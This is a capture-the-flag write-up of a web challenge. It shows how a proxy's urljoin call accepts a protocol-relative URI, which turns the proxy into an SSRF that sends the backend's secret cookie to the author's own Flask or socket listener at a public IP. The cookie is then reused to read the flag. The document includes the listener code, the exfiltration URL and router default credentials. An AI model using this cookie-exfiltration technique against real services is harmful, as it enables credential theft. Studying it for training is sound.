## Dont Touch My Flag

[dist_dont_touch_my_flag.tar.gz](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/dist_dont_touch_my_flag.tar.gz)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/chall.png)

> In this challenge, the server censors our output so we need to create our own server to intercept.

> Create personal flask server: Found in [flaskTest.py](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/flaskTest.py)

```python
from flask import Flask, request
app = Flask(__name__)

@app.route("/")
def hello():
    print(request.headers)
    return "Hello World!"

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=80)
```

> Alternatively, Create socketTCP server: Found in [socketServer.py](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/socketServer.py)

```python
from socket import *

serverPort = 80
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)

print('The server is ready to receive')

while True:
    connectionSocket, addr = serverSocket.accept()
    sentence = connectionSocket.recv(10000).decode()
    print(sentence)
    connectionSocket.send(b'\
HTTP/1.1 200 OK\n\
Date: Mon, 27 Jul 2009 12:28:53 GMT\n\
Server: Apache/2.2.14 (Win32)\n\
Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT\n\
Content-Length: 5\n\
Content-Type: text/html\n\n\
andre')
    connectionSocket.close()
```

> In proxy’s main.py we have:

```python
@app.route("/get")
def get():
    uri = request.args.get("uri", "/")
    full_url = urllib.parse.urljoin(os.environ["BACKEND_URL"], uri)

    r = requests.get(full_url, cookies={
        "secret": secret
    })
    if r.status_code != 200:
        return f"Request failed: received status code {r.status_code}"

    censored = censor(r.text)
    return censored
```

> So, if we append `/get?uri=//google.com`, The `full_url` will simply be `google.com`

> We can then change `google.com` to computer’s public ip address, which we can obtain from [whatismyip.com](https://www.whatismyip.com/)

> Now, before our public ip, `219.74.153.158`, can be used as a server, we need to do port forwarding.
- Setup public singtel router (http://192.168.1.254/) configuration to accept port 80
- user: root
- pass: admin
- Forward rules > IPv4 Port Mapping

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/portmapping.png)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/port80.png)

> Navigate to http://chals.ctf.sg:40101/get?uri=//219.74.153.158

> The Flask Server:

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/flask.png)

> The Socket Server:

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/socket.png)

> Create a cookie “secret” with the value above

> We need to navigate to /flag as shown here:

```python
@app.route("/")
def index():
    return """
Heres your flag: <span id="flag"></span>
<script>
fetch("/get?uri=/flag")
    .then((res) => res.text())
    .then((flag) => document.querySelector("#flag").innerText = flag);
</script>
"""
```

> With the secret cookie set, Navigate to http://chals.ctf.sg:40102/flag

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/dont-touch-my-flag/solved.png)

> Alternatively, you can use services like [ngrok](https://ngrok.com/) or [webhook](https://webhook.site/) that provides a neat user interface.

`CTFSG{d0nT_toUcH_mY_c00k13s}`
